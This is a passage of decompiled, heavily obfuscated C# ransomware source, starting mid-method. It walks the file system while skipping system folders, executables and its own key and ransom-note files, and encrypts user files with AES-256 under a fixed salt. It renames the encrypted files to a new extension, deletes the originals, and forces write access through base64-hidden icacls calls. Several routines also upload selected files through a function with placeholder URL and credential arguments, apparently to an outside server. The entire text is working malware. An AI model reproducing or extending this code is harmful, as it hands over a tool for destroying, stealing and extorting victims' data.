												yxXpRbVOOCdryf(item, item, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
											}
											else
											{
												yxXpRbVOOCdryf(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (dwCcrxocWgDvY)
											{
												try
												{
													File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while fully writing to file: " + ex25.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											sasdvwkURzh++;
											goto end_IL_050e_2;
										}
									}
									if (gIEIPYSAmb)
									{
										if (XVPoXZeuSDPoW != ".*")
										{
											AMIJuyhJOIXX(item + XVPoXZeuSDPoW, bytes3);
										}
										else
										{
											AMIJuyhJOIXX(item, bytes3);
										}
									}
									goto IL_0b81;
								}
								try
								{
									if (XVPoXZeuSDPoW != ".*")
									{
										if (VWdYBLRBOWpKB)
										{
											XVPoXZeuSDPoW = eyshXlTBtKESKXUD + XVPoXZeuSDPoW;
										}
										File.Move(item, item + XVPoXZeuSDPoW);
									}
								}
								catch (Exception ex27)
								{
									if (dwCcrxocWgDvY)
									{
										try
										{
											File.AppendAllText(HXSuIBiFjcFlYv, "File: " + item + " - Error while renaming to crypted extension: " + ex27.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									sasdvwkURzh++;
									goto end_IL_050e_2;
								}
								RYBnEKAqHJtC = "";
								if (XVPoXZeuSDPoW != ".*")
								{
									RYBnEKAqHJtC = item + XVPoXZeuSDPoW;
								}
								else
								{
									RYBnEKAqHJtC = item;
								}
								if (mAubhToVWX == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in DqnvzCWPBFOfV)
										{
											if (RYBnEKAqHJtC.ToLower().EndsWith(item2 + XVPoXZeuSDPoW) && gfooytrIBEuhQ == "YES")
											{
												if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > new FileInfo(RYBnEKAqHJtC).Length)
												{
													try
													{
														dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", RYBnEKAqHJtC);
													}
													catch
													{
													}
												}
											}
											else if (RYBnEKAqHJtC.ToLower().EndsWith(item2) && gfooytrIBEuhQ == "NO")
											{
												try
												{
													dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", RYBnEKAqHJtC);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text7 = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
								string text8 = "";
								text8 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
								string s4 = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (pCwzfECATcgjvGf == "NO")
								{
									byte[] array5 = null;
									byte[] array6 = xPAIwPiUUms.nBfapMPZnVY(RYBnEKAqHJtC, Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024);
									if (xPAIwPiUUms.YcWbtomCNUm(aGHJdwQqOXo: (!UZbqPEyevT) ? (gIEIPYSAmb ? xPAIwPiUUms.eiKYzlcqJmBscwSj(array6, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xPAIwPiUUms.eiKYzlcqJmBscwSj(array6, Convert.FromBase64String(IddhZgGIMBIoPTN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (gIEIPYSAmb ? CADchyJmisYEw.TMSpHRQaaiOBKQ(array6, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : CADchyJmisYEw.TMSpHRQaaiOBKQ(array6, Convert.FromBase64String(IddhZgGIMBIoPTN), Convert.FromBase64String(xcViaPUwRrRv))), BGtbjBjZGJVGg: RYBnEKAqHJtC, KOdDPjVHDFbTgV: bytes4))
									{
										goto IL_0b81;
									}
									try
									{
										File.Move(item + XVPoXZeuSDPoW, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!gIEIPYSAmb)
								{
									if (dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(RYBnEKAqHJtC, OQWxDJYHGaO, IddhZgGIMBIoPTN, null, Convert.FromBase64String(xcViaPUwRrRv)))
									{
										goto IL_0b81;
									}
									try
									{
										File.Move(item + XVPoXZeuSDPoW, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(RYBnEKAqHJtC, OQWxDJYHGaO, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_0b81;
									}
									try
									{
										File.Move(item + XVPoXZeuSDPoW, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_050e_2:;
							}
							catch (Exception)
							{
								goto IL_0b81;
							}
						}
					}
					continue;
					IL_0b81:
					KJURsTnTzliTNX.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(KJURsTnTzliTNX, delegate(string fileInfo)
		{
			if (!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data") && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("Инструкция") && !fileInfo.EndsWith(XVPoXZeuSDPoW) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(jMMJJGmjJwKTlH) && !fileInfo.Contains(HXSuIBiFjcFlYv) && !fileInfo.Contains(QHZTFDubwp))
			{
				if (IfCvhsXosKsEQ.Length != 0)
				{
					string[] array = IfCvhsXosKsEQ;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d5b;
					}
				}
				try
				{
					if (fileInfo.EndsWith(XVPoXZeuSDPoW))
					{
						goto IL_0d5b;
					}
				}
				catch (Exception)
				{
					goto IL_0d5b;
				}
				if (!snFJjGniiHtdTSH.Contains(fileInfo))
				{
					if (LDVZsbBiyOrU == "YES")
					{
						try
						{
							if (MYiVoJiDPuw.iXUrCyWwbDDP(fileInfo))
							{
								MYiVoJiDPuw.jBdsvnmIaKEzR(fileInfo);
							}
						}
						catch
						{
						}
					}
					snFJjGniiHtdTSH.Add(fileInfo);
					if (!UYClCmRdPD.Contains(Path.GetDirectoryName(fileInfo)))
					{
						UYClCmRdPD.Add(Path.GetDirectoryName(fileInfo));
					}
					CRHPenLGYTyWUT(fileInfo);
					try
					{
						new utrmZEFXTZjn().MXDXNXSoXoRHAN(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (MFBaFacYIYTeS)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							UkvSKngWEJZsJKEGJr(jLGThbkXlozfB("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + jLGThbkXlozfB("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + jLGThbkXlozfB("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (dwCcrxocWgDvY)
						{
							try
							{
								File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_0651;
							}
							goto end_IL_0651_2;
							end_IL_0651:;
						}
						catch (Exception ex4)
						{
							if (dwCcrxocWgDvY)
							{
								try
								{
									File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							sasdvwkURzh++;
							goto end_IL_0651_2;
						}
						if (UuZGAMCoQIPQQk == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024)
						{
							try
							{
								if (XVPoXZeuSDPoW != ".*")
								{
									if (VWdYBLRBOWpKB)
									{
										XVPoXZeuSDPoW = eyshXlTBtKESKXUD + XVPoXZeuSDPoW;
									}
									File.Move(fileInfo, fileInfo + XVPoXZeuSDPoW);
								}
							}
							catch (Exception ex6)
							{
								if (dwCcrxocWgDvY)
								{
									try
									{
										File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								sasdvwkURzh++;
								return;
							}
							if (XVPoXZeuSDPoW != ".*")
							{
								fileInfo += XVPoXZeuSDPoW;
							}
							if (mAubhToVWX == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in DqnvzCWPBFOfV)
									{
										if (fileInfo.ToLower().EndsWith(item3 + XVPoXZeuSDPoW) && gfooytrIBEuhQ == "YES")
										{
											if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item3) && gfooytrIBEuhQ == "NO")
										{
											try
											{
												dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
							string text2 = "";
							text2 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
							string s = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (pCwzfECATcgjvGf == "NO")
							{
								byte[] array2 = null;
								byte[] array3 = xPAIwPiUUms.nBfapMPZnVY(fileInfo, Convert.ToInt32(OQWxDJYHGaO) * 1024 * 1024);
								if (!xPAIwPiUUms.YcWbtomCNUm(aGHJdwQqOXo: (!UZbqPEyevT) ? (gIEIPYSAmb ? xPAIwPiUUms.eiKYzlcqJmBscwSj(array3, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xPAIwPiUUms.eiKYzlcqJmBscwSj(array3, Convert.FromBase64String(IddhZgGIMBIoPTN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (gIEIPYSAmb ? CADchyJmisYEw.TMSpHRQaaiOBKQ(array3, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : CADchyJmisYEw.TMSpHRQaaiOBKQ(array3, Convert.FromBase64String(IddhZgGIMBIoPTN), Convert.FromBase64String(xcViaPUwRrRv))), BGtbjBjZGJVGg: fileInfo, KOdDPjVHDFbTgV: bytes))
								{
									try
									{
										File.Move(fileInfo + XVPoXZeuSDPoW, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!gIEIPYSAmb)
							{
								if (!dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(fileInfo, OQWxDJYHGaO, IddhZgGIMBIoPTN, null, Convert.FromBase64String(xcViaPUwRrRv)))
								{
									try
									{
										File.Move(fileInfo + XVPoXZeuSDPoW, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!dRHdGUnJfHhyVsbn.OOezEpsxnEQlad(fileInfo, OQWxDJYHGaO, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(fileInfo + XVPoXZeuSDPoW, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (VWdYBLRBOWpKB)
							{
								XVPoXZeuSDPoW = eyshXlTBtKESKXUD + XVPoXZeuSDPoW;
							}
							string text3 = utDHmaEnPafSsZ.zXqCMkpXvvDkS(32);
							string text4 = "";
							text4 = (gIEIPYSAmb ? utDHmaEnPafSsZ.GdIXFYPygrqzMs() : "");
							string s2 = JXLBTRDtuzyaHWFE.hHOovCgFovscyM(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (XVPoXZeuSDPoW != ".*")
							{
								if (!EepcEiTneJt)
								{
									if (!gIEIPYSAmb)
									{
										XsskrIIoBJbNJ(fileInfo, fileInfo + XVPoXZeuSDPoW, ydkkPXGHXdHLQJ);
									}
									else
									{
										XsskrIIoBJbNJ(fileInfo, fileInfo + XVPoXZeuSDPoW, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!gIEIPYSAmb)
										{
											yxXpRbVOOCdryf(fileInfo, fileInfo + XVPoXZeuSDPoW, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
										}
										else
										{
											yxXpRbVOOCdryf(fileInfo, fileInfo + XVPoXZeuSDPoW, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (dwCcrxocWgDvY)
										{
											try
											{
												File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while fully writing to file: " + ex11.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										sasdvwkURzh++;
										try
										{
											File.Move(fileInfo + XVPoXZeuSDPoW, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!EepcEiTneJt)
							{
								if (!gIEIPYSAmb)
								{
									XsskrIIoBJbNJ(fileInfo, fileInfo + ".part", ydkkPXGHXdHLQJ);
								}
								else
								{
									XsskrIIoBJbNJ(fileInfo, fileInfo + ".part", Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!gIEIPYSAmb)
									{
										yxXpRbVOOCdryf(fileInfo, fileInfo, ydkkPXGHXdHLQJ, Convert.FromBase64String(xcViaPUwRrRv));
									}
									else
									{
										yxXpRbVOOCdryf(fileInfo, fileInfo, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (dwCcrxocWgDvY)
									{
										try
										{
											File.AppendAllText(HXSuIBiFjcFlYv, "File: " + fileInfo + " - Error while fully writing to file: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									sasdvwkURzh++;
									return;
								}
							}
							if (gIEIPYSAmb)
							{
								if (XVPoXZeuSDPoW != ".*")
								{
									AMIJuyhJOIXX(fileInfo + XVPoXZeuSDPoW, bytes2);
								}
								else
								{
									AMIJuyhJOIXX(fileInfo, bytes2);
								}
							}
						}
						end_IL_0651_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d5b;
			IL_0d5b:
			KJURsTnTzliTNX.Remove(fileInfo);
		});
	}

	private static void sdeaXOudwLJhuj(string XEPsJDmfdMUx, string ibOFbfIZWMFm, byte[] ZjCVMxukBrZT)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(ibOFbfIZWMFm, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(ZjCVMxukBrZT, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(XEPsJDmfdMUx, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (ibOFbfIZWMFm.Length > 0)
				{
					FileStream fileStream3 = new FileStream(XEPsJDmfdMUx, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (mAubhToVWX == "YES")
					{
						foreach (string item in DqnvzCWPBFOfV)
						{
							if (XEPsJDmfdMUx.ToLower().EndsWith(item) && gfooytrIBEuhQ == "YES")
							{
								if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", XEPsJDmfdMUx);
									}
									catch
									{
									}
								}
							}
							else if (XEPsJDmfdMUx.ToLower().EndsWith(item) && gfooytrIBEuhQ == "NO")
							{
								try
								{
									dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", XEPsJDmfdMUx);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(XEPsJDmfdMUx) && num2 >= 0)
							{
								File.Delete(XEPsJDmfdMUx);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (ibOFbfIZWMFm.EndsWith(".part"))
					{
						File.Move(ibOFbfIZWMFm, ibOFbfIZWMFm.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(ibOFbfIZWMFm);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void yxXpRbVOOCdryf(string NabqvAzlEWPBU, string fXRkQdSGRhLGHq, byte[] kRtJqvBUWFMnlWk, byte[] GKSdXPeJZdBbB = null)
	{
		try
		{
			if (mAubhToVWX == "YES")
			{
				FileStream fileStream = new FileStream(NabqvAzlEWPBU, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in DqnvzCWPBFOfV)
				{
					if (NabqvAzlEWPBU.ToLower().EndsWith(item) && gfooytrIBEuhQ == "YES")
					{
						if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", NabqvAzlEWPBU);
							}
							catch
							{
							}
						}
					}
					else if (NabqvAzlEWPBU.ToLower().EndsWith(item) && gfooytrIBEuhQ == "NO")
					{
						try
						{
							dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", NabqvAzlEWPBU);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (NabqvAzlEWPBU != fXRkQdSGRhLGHq)
		{
			File.Move(NabqvAzlEWPBU, fXRkQdSGRhLGHq);
			NabqvAzlEWPBU = fXRkQdSGRhLGHq;
		}
		byte[] bytes = CADchyJmisYEw.TMSpHRQaaiOBKQ(File.ReadAllBytes(NabqvAzlEWPBU), kRtJqvBUWFMnlWk, GKSdXPeJZdBbB);
		File.WriteAllBytes(NabqvAzlEWPBU, bytes);
		MkfVCujHefEQ++;
	}

	private static void XsskrIIoBJbNJ(string ZQdvcyLsHsBln, string GfwPywgBsKPJ, byte[] TraTNqykfaJx)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = GfwPywgBsKPJ;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(TraTNqykfaJx, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (cIiOGifyTwmZ == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ZQdvcyLsHsBln, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(ZQdvcyLsHsBln, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(ZQdvcyLsHsBln, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (GfwPywgBsKPJ.Length > 0)
				{
					if (mAubhToVWX == "YES")
					{
						FileStream fileStream4 = new FileStream(ZQdvcyLsHsBln, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in DqnvzCWPBFOfV)
						{
							if (ZQdvcyLsHsBln.ToLower().EndsWith(item) && gfooytrIBEuhQ == "YES")
							{
								if (Convert.ToInt32(PHGxbhgUwHl) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", ZQdvcyLsHsBln);
									}
									catch
									{
									}
								}
							}
							else if (ZQdvcyLsHsBln.ToLower().EndsWith(item) && gfooytrIBEuhQ == "NO")
							{
								try
								{
									dOKSsqBdzEjH.pEDftRXwVmeoGGRN("URL", "USERNAME", "ACCESO", ZQdvcyLsHsBln);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(ZQdvcyLsHsBln);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (GfwPywgBsKPJ.EndsWith(".part"))
					{
						File.Move(GfwPywgBsKPJ, GfwPywgBsKPJ.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(GfwPywgBsKPJ))
							{
								File.Delete(GfwPywgBsKPJ);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(HXSuIBiFjcFlYv, "File: " + ZQdvcyLsHsBln + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
